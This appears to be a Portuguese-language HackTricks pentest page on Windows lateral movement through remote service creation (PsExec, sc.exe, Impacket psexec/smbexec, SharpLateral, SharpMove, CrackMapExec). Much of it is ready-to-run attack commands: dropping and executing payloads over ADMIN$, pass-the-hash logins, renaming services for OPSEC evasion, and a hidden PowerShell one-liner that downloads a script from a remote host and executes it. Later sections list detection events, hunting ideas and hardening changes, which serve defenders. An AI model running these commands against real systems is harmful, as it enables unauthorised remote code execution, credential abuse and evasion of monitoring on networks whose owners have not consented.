# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Como eles funcionam

Essas técnicas abusam do Gerenciador de Controle de Serviços do Windows (SCM) remotamente via SMB/RPC para executar comandos em um host alvo. O fluxo comum é:

1. Autenticar-se no alvo e acessar o compartilhamento ADMIN$ via SMB (TCP/445).
2. Copiar um executável ou especificar uma linha de comando LOLBAS que o serviço irá executar.
3. Criar um serviço remotamente via SCM (MS-SCMR sobre \PIPE\svcctl) apontando para esse comando ou binário.
4. Iniciar o serviço para executar o payload e, opcionalmente, capturar stdin/stdout via um pipe nomeado.
5. Parar o serviço e limpar (deletar o serviço e quaisquer binários deixados).

Requisitos/pré-requisitos:
- Administrador Local no alvo (SeCreateServicePrivilege) ou direitos explícitos de criação de serviço no alvo.
- SMB (445) acessível e compartilhamento ADMIN$ disponível; Gerenciamento de Serviço Remoto permitido através do firewall do host.
- Restrições Remotas do UAC: com contas locais, a filtragem de token pode bloquear o admin pela rede, a menos que use o Administrador embutido ou LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: usar um nome de host/FQDN habilita Kerberos; conectar por IP muitas vezes recai no NTLM (e pode ser bloqueado em ambientes endurecidos).

### ScExec/WinExec Manual via sc.exe

O seguinte mostra uma abordagem mínima de criação de serviço. A imagem do serviço pode ser um EXE deixado ou um LOLBAS como cmd.exe ou powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notas:
- Espere um erro de timeout ao iniciar um EXE que não seja um serviço; a execução ainda acontece.
- Para permanecer mais amigável ao OPSEC, prefira comandos sem arquivo (cmd /c, powershell -enc) ou exclua artefatos deixados.

Encontre passos mais detalhados em: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Ferramentas e exemplos

### Sysinternals PsExec.exe

- Ferramenta clássica de administração que usa SMB para soltar PSEXESVC.exe em ADMIN$, instala um serviço temporário (nome padrão PSEXESVC) e faz proxy de I/O através de pipes nomeados.
- Exemplos de uso:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Você pode iniciar diretamente do Sysinternals Live via WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Deixa eventos de instalação/desinstalação de serviço (o nome do serviço é frequentemente PSEXESVC, a menos que -r seja usado) e cria C:\Windows\PSEXESVC.exe durante a execução.

### Impacket psexec.py (semelhante ao PsExec)

- Usa um serviço embutido semelhante ao RemCom. Lança um binário de serviço transitório (nome comumente aleatório) via ADMIN$, cria um serviço (o padrão é frequentemente RemComSvc) e proxy I/O através de um pipe nomeado.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artefatos
- EXE temporário em C:\Windows\ (8 caracteres aleatórios). O nome do serviço padrão é RemComSvc, a menos que substituído.

### Impacket smbexec.py (SMBExec)

- Cria um serviço temporário que gera cmd.exe e usa um pipe nomeado para I/O. Geralmente evita soltar um payload EXE completo; a execução de comandos é semi-interativa.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral e SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa vários métodos de movimento lateral, incluindo exec baseado em serviço.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) inclui modificação/criação de serviço para executar um comando remotamente.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Você também pode usar CrackMapExec para executar através de diferentes backends (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detecção e artefatos

Artefatos típicos de host/rede ao usar técnicas semelhantes ao PsExec:
- Segurança 4624 (Tipo de Logon 3) e 4672 (Privilégios Especiais) no alvo para a conta de administrador utilizada.
- Segurança 5140/5145 Eventos de Compartilhamento de Arquivos e Detalhes de Compartilhamento de Arquivos mostrando acesso ADMIN$ e criação/escrita de binários de serviço (por exemplo, PSEXESVC.exe ou .exe aleatório de 8 caracteres).
- Segurança 7045 Instalação de Serviço no alvo: nomes de serviços como PSEXESVC, RemComSvc, ou personalizados (-r / -service-name).
- Sysmon 1 (Criação de Processo) para services.exe ou a imagem do serviço, 3 (Conexão de Rede), 11 (Criação de Arquivo) em C:\Windows\, 17/18 (Pipe Criado/Conectado) para pipes como \\.\pipe\psexesvc, \\.\pipe\remcom_*, ou equivalentes aleatórios.
- Artefato de Registro para EULA do Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 no host do operador (se não suprimido).

Ideias de caça
- Alerta em instalações de serviços onde o ImagePath inclui cmd.exe /c, powershell.exe, ou locais TEMP.
- Procure por criações de processos onde ParentImage é C:\Windows\PSEXESVC.exe ou filhos de services.exe executando como SYSTEM LOCAL executando shells.
- Marque pipes nomeados terminando com -stdin/-stdout/-stderr ou nomes de pipes de clone do PsExec bem conhecidos.

## Solucionando falhas comuns
- Acesso negado (5) ao criar serviços: não é realmente administrador local, restrições de UAC para contas locais, ou proteção contra manipulação de EDR no caminho do binário do serviço.
- O caminho da rede não foi encontrado (53) ou não foi possível conectar ao ADMIN$: firewall bloqueando SMB/RPC ou compartilhamentos de administrador desativados.
- Kerberos falha, mas NTLM está bloqueado: conecte usando hostname/FQDN (não IP), assegure SPNs adequados, ou forneça -k/-no-pass com tickets ao usar Impacket.
- O tempo de início do serviço expira, mas o payload foi executado: esperado se não for um binário de serviço real; capture a saída em um arquivo ou use smbexec para I/O ao vivo.

## Notas de endurecimento (mudanças modernas)
- Windows 11 24H2 e Windows Server 2025 exigem assinatura SMB por padrão para conexões de saída (e Windows 11 de entrada). Isso não quebra o uso legítimo do PsExec com credenciais válidas, mas previne abusos de relay SMB não assinado e pode impactar dispositivos que não suportam assinatura.
- O novo bloqueio NTLM do cliente SMB (Windows 11 24H2/Server 2025) pode impedir o fallback NTLM ao conectar por IP ou a servidores não-Kerberos. Em ambientes endurecidos, isso quebrará PsExec/SMBExec baseado em NTLM; use Kerberos (hostname/FQDN) ou configure exceções se necessário legitimamente.
- Princípio do menor privilégio: minimize a associação de administrador local, prefira Just-in-Time/Just-Enough Admin, aplique LAPS e monitore/alarme sobre instalações de serviços 7045.

## Veja também

- Execução remota baseada em WMI (geralmente mais sem arquivos):
{{#ref}}
./wmiexec.md
{{#endref}}

- Execução remota baseada em WinRM:
{{#ref}}
./winrm.md
{{#endref}}



## Referências

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- Endurecimento de segurança SMB no Windows Server 2025 & Windows 11 (assinatura por padrão, bloqueio NTLM): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
{{#include ../../banners/hacktricks-training.md}}
